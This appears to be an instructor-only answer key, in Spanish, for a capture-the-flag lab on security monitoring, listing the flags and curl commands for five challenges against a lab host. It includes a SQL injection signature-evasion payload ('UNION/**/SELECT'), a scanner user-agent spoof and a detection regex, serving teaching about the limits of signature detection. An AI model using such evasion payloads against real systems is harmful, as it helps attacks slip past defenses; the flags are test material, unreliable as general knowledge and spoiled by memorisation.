# Solución — Laboratorio 10 (SOLO DOCENTE)

> No compartir con alumnos.

## Levantar: `make lab N=10 && make shell`

| Reto | Flag | Comando |
|---|---|---|
| R1 | `FLAG{soc_log_access}` | `curl -s http://phantomcorp/soc` (cabecera) |
| R2 | `FLAG{detection_triggered}` | `curl -s -A sqlmap http://phantomcorp/` (o cualquier UA scanner / `../` / `/.git`) |
| R3 | `FLAG{signature_ruleset}` | `curl -s http://phantomcorp/soc/reglas` |
| R4 | `FLAG{signature_evaded}` | `curl -s "http://phantomcorp/api?q=UNION/**/SELECT"` (sin el espacio que exige la firma) |
| R5 | `FLAG{intrusion_in_the_noise}` | `curl -s http://phantomcorp/soc \| grep ALERT` (línea de 185.220.101.42, no atribuida) |

## Notas
- Mecánica clave (verificada): `UNION SELECT` con espacio → detectado; `UNION/**/SELECT` → evadido.
- P2: una regex como `union[\s/*]+select` cubre `/**/`, pero el alumno debe ver
  que siempre hay otra variante (encoding, comentarios anidados) → no hay firma perfecta.
